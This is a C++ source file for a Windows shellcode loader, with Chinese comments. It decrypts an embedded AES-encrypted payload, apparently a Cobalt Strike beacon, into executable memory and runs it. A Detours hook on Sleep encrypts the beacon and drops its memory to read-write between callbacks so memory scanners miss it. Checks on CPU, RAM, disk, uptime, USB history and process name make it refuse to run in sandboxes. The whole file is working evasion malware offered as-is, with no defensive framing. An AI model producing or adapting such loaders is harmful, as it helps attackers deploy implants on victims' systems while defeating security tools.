#include <windows.h>
#include "AES.h"
#include <detours.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <regex>

#ifdef _WIN64
#pragma comment(lib,"detours_x64.lib")
#else
#pragma comment(lib,"detours_x86.lib")
#endif

typedef LPVOID(*MySleep)(DWORD dwMilliseconds);

typedef struct {
    LPVOID address;    // 内存地址
    DWORD size;        // 内存大小
} MemoryAttrib;

typedef struct {
    MemoryAttrib memoryPage[3];  // 最多3个符合条件的目标内存页
    int index;                   // 内存下标
    unsigned char* key;          // 加解密key
    BOOL isScanMemory;           // 是否已查找内存页信息
    BOOL iscleaned;              // 是否清除之前的beacon和shellcode遗留
    LPVOID shellcodeaddress;     // shellcode起始位置
    int shellcodesize;           // shellcode大小
} MemoryInfo;

MemoryInfo memoryInfo;

static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI My_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    LPVOID address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    printf("开辟了空间地址： %p\n", address);
    return address;
}

void DeleteOther() {
    MemoryAttrib beacon_1 = memoryInfo.memoryPage[memoryInfo.index - 2];
    MemoryAttrib beacon_2 = memoryInfo.memoryPage[memoryInfo.index - 1];

    if (beacon_2.size > beacon_1.size) {
        std::swap(memoryInfo.memoryPage[memoryInfo.index - 1], memoryInfo.memoryPage[memoryInfo.index - 2]);
    }

    MemoryAttrib Beacon_org = memoryInfo.memoryPage[memoryInfo.index - 2];
    DWORD org_bufSize = Beacon_org.size;
    RtlSecureZeroMemory(Beacon_org.address, org_bufSize); // 文件形式的beacon消除
    DWORD oldProt;
    VirtualProtect(Beacon_org.address, Beacon_org.size, PAGE_READWRITE, &oldProt); // 修改内存属性

    memoryInfo.iscleaned = TRUE;
}

void ScanMemoryMap() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID lpAddress = 0;
    HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());
    int* index = &memoryInfo.index;

    while (VirtualQueryEx(hProcess, lpAddress, &mbi, sizeof(mbi))) {
        if ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE) && mbi.Type == MEM_PRIVATE) {
            memoryInfo.memoryPage[*index].address = mbi.BaseAddress;
            memoryInfo.memoryPage[*index].size = (DWORD)mbi.RegionSize;
            (*index)++;
            if ((*index) >= 3) break;
        }
        lpAddress = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    memoryInfo.isScanMemory = TRUE;
    VirtualFree(memoryInfo.memoryPage[0].address, 0, MEM_RELEASE);
}

void AESEncode(unsigned char* plain, int plain_size) {
    if (plain_size % 16 != 0) {
        plain_size += (16 - (plain_size % 16));
    }
    unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    AES aes(AESKeyLength::AES_128);
    unsigned char* cipher = aes.EncryptCBC(plain, plain_size, memoryInfo.key, iv);
    memcpy(plain, cipher, plain_size);
}

void AESDecode(unsigned char* cipher, int cipher_size) {
    unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    AES aes(AESKeyLength::AES_128);
    unsigned char* res_plain = aes.DecryptCBC(cipher, cipher_size, memoryInfo.key, iv);
    memcpy(cipher, res_plain, cipher_size);
}

void My_Encrypt() {
    MemoryAttrib Beacon = memoryInfo.memoryPage[memoryInfo.index - 1];
    unsigned char* buffer = (unsigned char*)(Beacon.address);
    int bufSizeRounded = (Beacon.size - (Beacon.size % sizeof(unsigned int)));
    AESEncode(buffer, bufSizeRounded);

    DWORD oldProt;
    VirtualProtect(Beacon.address, Beacon.size, PAGE_READWRITE, &oldProt);
    printf("Beacon已加密并将内存页属性调整为 RW.\n");
}

void My_Decrypt() {
    MemoryAttrib Beacon = memoryInfo.memoryPage[memoryInfo.index - 1];
    unsigned char* buffer = (unsigned char*)(Beacon.address);
    int bufSizeRounded = (Beacon.size - (Beacon.size % sizeof(unsigned int)));
    AESDecode(buffer, bufSizeRounded);

    DWORD oldProt;
    VirtualProtect(Beacon.address, Beacon.size, PAGE_EXECUTE_READWRITE, &oldProt);
    printf("Beacon已解密并内存页属性调整为 RWX.\n");
}

static void(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI My_Sleep(DWORD dwMilliseconds) {
    printf("调用sleep，休眠时间：%d\n", dwMilliseconds);
    if (!memoryInfo.isScanMemory) ScanMemoryMap();
    if (!memoryInfo.iscleaned) DeleteOther();
    My_Encrypt();
    OldSleep(dwMilliseconds);
    My_Decrypt();
}

void hookfun() {
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)OldSleep, My_Sleep);
    if (0 == DetourTransactionCommit()) {
        printf("hooked succeed\n");
    }
    else {
        printf("hook failed\n");
    }
}

void unhookfun() {
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)OldSleep, My_Sleep);
    if (0 == DetourTransactionCommit()) {
        printf("unhooked succeed\n");
    }
    else {
        printf("unhook failed\n");
    }
}

void InitMemoryInfo(LPVOID shellcodeaddress, int size) {
    memoryInfo.index = 0;
    memoryInfo.isScanMemory = FALSE;
    unsigned char keys[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    memoryInfo.key = keys;
    memoryInfo.iscleaned = FALSE;
    memoryInfo.shellcodeaddress = shellcodeaddress;
    memoryInfo.shellcodesize = size;
}

bool checkcpu() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    return systemInfo.dwNumberOfProcessors >= 2;
}

bool checkRAM() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    return memoryStatus.ullTotalPhys / 1024 / 1024 >= 2048;
}

bool checkHDD() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    return diskSizeGB >= 100;
}

bool checkUptime() {
    return GetTickCount() > 3600000;
}

BOOL accelerated_sleep() {
    DWORD dwStart = GetTickCount();
    MySleep mySlp = (MySleep)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Sleep");
    mySlp(30 * 1000);
    return (GetTickCount() - dwStart) < 29000;
}

bool checkprocessnameandpath() {
    char currentProcessPath[MAX_PATH + 1];
    GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);
    return strstr(currentProcessPath, "My_RandomEncrypt.exe") != NULL;
}

bool checkusbnum() {
    HKEY hKey;
    DWORD mountedUSBDevicesCount;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
    RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return mountedUSBDevicesCount >= 1;
}

int main() {
    unsigned char cipher[] = "\xbf\x2b\x21\x07\xdf\x2d\xea\x60\xa5\x88\xc4\x9c\x28\x5f\x5c\xfa\x7f\x1e\x47\x42\x7a\xcb\x68\xd5\xfb\x1c\x17\xdc\x9f\x0a\x2a\xda\x97\xcf\x4d\x56\xce\xa1\xc2\xa8\x8f\xd3\x5b\x0a\x41\x2c\x63\xec\x17\xfd\x4f\x43\xbb\xfa\xe5\xbe\x23\x71\xed\xf4\x21\xbf\xd8\xab\x17\x0c\x55\xc0\x53\x25\xef\xce\x59\xfc\x33\x0e\x68\xbf\x8d\xd0\x85\x9e\x8d\xef\xb6\x71\x2a\x85\xff\xab\xfa\x46\xdd\x71\x69\xfd\x90\x6f\x14\x51\x37\xa7\x94\x3c\xea\x13\x11\x7f\x4c\x7b\x00\xcd\xf6\xf0\x6a\x46\xa3\x4a\x23\x65\xce\x03\x77\xa0\xf8\x49\xa1\x7b\xb3\x6f\x5f\xda\xb7\xb0\xe1\xd4\xba\x4a\xee\x88\x80\x15\x9f\xe5\xa4\x55\x08\x57\x75\xdd\xf9\xe0\x45\x3a\xc7\x8e\xd5\x4f\x8d\x6d\x35\x9d\xd1\x5d\x62\x05\x6a\x74\x2a\xdc\xc9\x54\xaf\x71\xc4\xb4\x59\xcd\x25\x92\xaa\xb8\x28\xb5\x3f\x89\xc1\x3f\x55\xd0\x12\xcb\x87\xcc\xdc\x28\xb9\xd0\x7d\x15\xce\x35\x93\xbe\x58\x2b\xc4\x75\x03\xda\x67\x5d\x21\xbe\x83\xd0\x82\x95\xa8\x55\x64\x0e\xa7\x13\x3e\xcd\x41\x79\xa6\x06\x69\xd2\x2c\xb3\x81\xee\x26\x77\xaf\x82\x2c\x12\x4f\x19\x7b\xcf\xa1\x78\xd1\xcf\x01\x14\x0f\xea\x34\x68\xe9\x43\x21\x19\xab\x95\xd0\xe8\xd7\x90\x84\x17\x95\xf3\x87\x92\xc9\x40\xa9\x63\xbc\x53\x18\x56\x04\xb6\xbf\xcf\xe2\xc6\x7c\x29\x84\xbc\x3c\xfb\x80\xed\xac\x32\x9e\x04\xca\x08\xdf\x6a\xfb\x40\x55\x63\x9e\xd1\x1e\xb2\x21\xab\x4e\x53\xac\xf4\x5f\xc5\x0f\x56\x23\xc9\x09\xe4\xb1\x5c\x5e\xdb\x91\xdf\xdf\x13\x74\xee\xb4\x31\x66\xfb\x61\x69\x09\xb2\xdd\xe2\x1b\x2c\x81\x85\x42\xce\xd5\x00\xd6\x40\x9e\xe4\xda\xf2\x01\x45\x1d\xa3\x43\x08\xb1\x92\x5c\xbe\xce\xc1\x8e\x24\x33\x1b\x4b\x7c\x9b\x80\xc0\xb0\xbf\xb3\xb6\xa0\xa8\x5d\x8a\x3a\x1c\xe9\xa6\xd6\x60\x55\x97\x27\xf8\xb1\x8c\x2f\xcf\x2a\x36\x99\x90\xe9\x96\x95\xb3\x42\xfd\x2b\xe9\xdd\xa0\x9a\x33\x76\xa5\x4a\xaa\xb7\xaf\xd7\xb0\x19\xa3\x27\x6b\x5e\xf9\x4b\x79\xdf\x04\x91\x88\x5c\x57\x6b\xe2\x8a\x3e\x12\xc1\x98\xa1\xb4\x66\xd8\x22\xe4\x1a\xae\xb6\xe1\x1d\x0a\x22\x22\xf7\xb6\xc6\x9b\xae\x2a\xfd\x2a\x85\xe7\x89\x33\x6b\x90\xad\xe2\x5f\x81\xb7\xc5\x7a\x57\xcd\xdc\x4f\x0d\xca\x89\x5a\x82\x22\x14\xa5\xf0\xbc\xbb\xc0\x53\x73\x08\xb5\xee\x05\xec\x33\xbf\x80\x7b\x1f\x18\x4b\xb8\xef\xda\x39\x63\x91\x40\xe6\xc6\x83\x85\xb5\xd8\xcb\x45\x88\x63\x07\x75\x25\x59\xa7\x11\x4f\x7b\x2d\x9d\x72\x2a\x03\x8d\x0d\xc2\x06\x89\xb7\xb3\x21\xf3\x2b\x96\x9d\x90\x52\x22\x6d\x02\x9e\xae\x6c\x7b\xce\x30\x3b\x0e\x2d\xcd\xcc\x90\x03\x42\xbc\x6e\x37\x7f\xc6\x1a\x8a\x03\x54\x2d\x66\xad\xdb\x3a\x5f\xe2\x1c\x5a\xc3\x03\x12\xd6\x59\xa8\xb5\x51\x62\x4d\x18\x5a\xa7\x98\xb8\xfa\x96\x91\xd8\x9f\xa0\x47\x43\xda\x94\xbc\x40\x0f\x1c\x1f\xa4\x85\x85\xbe\x8f\x25\x40\x9a\xc8\xb4\xd1\x08\x40\x70\x1a\x35\xa2\x6e\xa4\x99\xce\xd9\x61\xaa\x56\x10\x47\x00\xb2\x1f\xab\x5f\x6c\xcf\xf1\x7c\x7c\x00\xa6\x2a\x48\x18\xeb\xb4\x23\x53\xe5\xd7\xe4\x75\x0d\xc4\x84\x92\x15\x08\x62\xb4\x14\xea\x40\xc8\x67\xd2\xfb\xbf\x82\xf4\x6b\x0d\x0f\x48\x7c\xc4\x8f\xb7\xf1\xec\xd0\xff\x02\x83\x28\xbc\xd8\x4a\x69\xc5\x5c\x08\x64\x51\x5a\xc3\x51\x8a\x5c\x18\xe3\xe5\x26\xfb\x73\x32\x21\x9f\xe2\xa2\x54\x5d\x12\x42\x42\xea\xe0\x3f\xaf\x59\x5f\x83\x84\x04\x57\x39\xac\x6e\x45\x9b\x56\xca\x20\x07\xfe\xeb\xf6\x58\xb2\x46\x3f\xab\xfa\xbf\xd3\xd2\xd1\x69\xe7\xaf\xb7\x4a\x07\xba\xbb\x8b\x8d\x5c\xc8\x88\x16\x92\x19\xbb\xdb\xaf\xbc\x0d\x90\x8c\x94\x82\x2e\x07\xa8\x33\x5d\xef\xef\x21\x03\xff\xa6\x82\x2d\x6c\x40\x3a\xd8\xdb\x80\xca\x42\xfa\x11\x06\xbc\xa5\xd0\x12\xad\x30\xf8\xae\x73\xfc\xe5\xfd\x10\xab\x00\xad\xb2\x4c\xc2\xbb\xca\x5f\x74\x97\x79\xa1\x71\x6e\xf7\x13\x45\x4d\x46\x85\xac\x84\xd5\xd7\x95\xe3\xab\x4f\x79\xd1\x27\xd3\xa5\x32\x1c\xd5\x9a\x5d\x5a\x4a\x0a\x8b\xc6\xa8\xab\x8e\xb9\x80\x34\x8a\x44\xc8\xd0\x26\x7f\xef\x82\x6e\x51\xb4\x5a\xbb\x47\x1b\xc5\xc0\xb7\x8c\x44\x5a\xa6\xc9\x62\x62\xbe\x5f\x2f\xc2\x7f\x98\x9b\x5d\x7e\xff\xe6\x48\x30\x80\xfb\xc2\x82\xeb\xdd\x1c\xcf\xf1\x1f\x96\x59\x4e\x9b\x7b\xed\xc6\xa0\x0a\xef\x77\x15\x72\xdf\x5f\xa7\x51\xa8\xa6\x72\xb1\x34\x9e\xa3\xf9\x39\x9f\xfd\x6c\x9e\x94\x8e\x29\xa4\xa2\x15\x25\x72\x29\xc8\x4f\x4f\x44\x23\x20\x56\xfe\xf7\x96\x1a\xd1\xfe\x68\x0e\xb0\x75\x22\xc1\x88\x86\xc8\x7e\xd3\x4c\xb8\x36\x1e\x00\xb9\xca\x90\xf9\x99\x6b\x53\xb0\xe6\x47\x9a\x91\x85\x33\xa2\xf1\x06\x67\x52\xa3\xba\xe2\xa5\x30\x73\x85\x2a\xa7\x87\x39\x4e\xb7\xac\x1a\xfa\x36\xba\x94\x51\x1a\xbb\x73\x19\xbe\x19\x19\xc6";

    AES aes(AESKeyLength::AES_128);
    unsigned char iv[] = { 0xce, 0x13, 0xc8, 0x32, 0xdc, 0xcd, 0xa6, 0x79, 0x75, 0x1e, 0x6a, 0x94, 0x97, 0x77, 0x1f, 0xe4 };
    unsigned char key[] = { 0x1d, 0xce, 0x6c, 0xf4, 0x57, 0xd2, 0x5e, 0x8d, 0x42, 0x2b, 0x02, 0xdd, 0x29, 0x6c, 0x60, 0xaf };
    int cipher_size = sizeof(cipher) / sizeof(cipher[0]) - 1;

    if (!accelerated_sleep() && checkUptime() && checkcpu() && checkRAM() && checkprocessnameandpath() && checkHDD() && checkusbnum()) {
        unsigned char* buf = aes.DecryptCBC(cipher, cipher_size, key, iv);
        hookfun();
        LPVOID mem = VirtualAlloc(NULL, cipher_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("shellcode的真实地址：%x", mem);
        memcpy(mem, buf, cipher_size);
        InitMemoryInfo(mem, cipher_size);
        ((void(*)())mem)();
    }
    else {
        printf("环境检测未通过\n");
    }

    return 0;
}
